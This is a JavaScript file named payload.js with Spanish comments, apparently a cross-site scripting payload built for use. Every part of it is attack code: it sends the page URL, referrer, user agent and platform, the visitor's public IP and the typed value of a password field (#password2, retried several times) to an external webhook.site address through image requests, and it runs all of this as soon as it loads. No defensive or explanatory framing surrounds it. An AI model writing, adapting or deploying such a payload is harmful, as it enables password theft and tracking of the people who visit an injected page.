
// =======================
// payload.js (sólo con Image().src, mínimo funcional)
// =======================

const EXFIL_BASE = 'https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291';

// Enviar datos usando Image
function exfiltrar(tipo, contenido) {
  const img = new Image();
  const url = `${EXFIL_BASE}?tipo=${encodeURIComponent(tipo)}&data=${encodeURIComponent(contenido)}`;
  img.src = url;
}

// 1. Info del navegador
function infoNavegador() {
  try {
    const data = [
      'URL: ' + location.href,
      'Referrer: ' + document.referrer,
      'User-Agent: ' + navigator.userAgent,
      'Idioma: ' + navigator.language,
      'Plataforma: ' + navigator.platform
    ].join(' | ');
    exfiltrar('navegador', data);
  } catch (e) {}
}

// 2. IP pública
function obtenerIPPublica() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => exfiltrar('ip_publica', data.ip))
    .catch(() => {});
}

// 3. Contraseña del campo #password2 (con reintentos)
function robarPassword() {
  let intentos = 0;
  const maxIntentos = 5;

  function intentar() {
    const input = document.querySelector('#password2');
    if (input && input.value && input.value.length > 0) {
      exfiltrar('password_input', input.value);
    } else if (intentos < maxIntentos) {
      intentos++;
      setTimeout(intentar, 2000);
    }
  }

  setTimeout(intentar, 2000);
}

// === Ejecutar ===
infoNavegador();
obtenerIPPublica();
robarPassword();
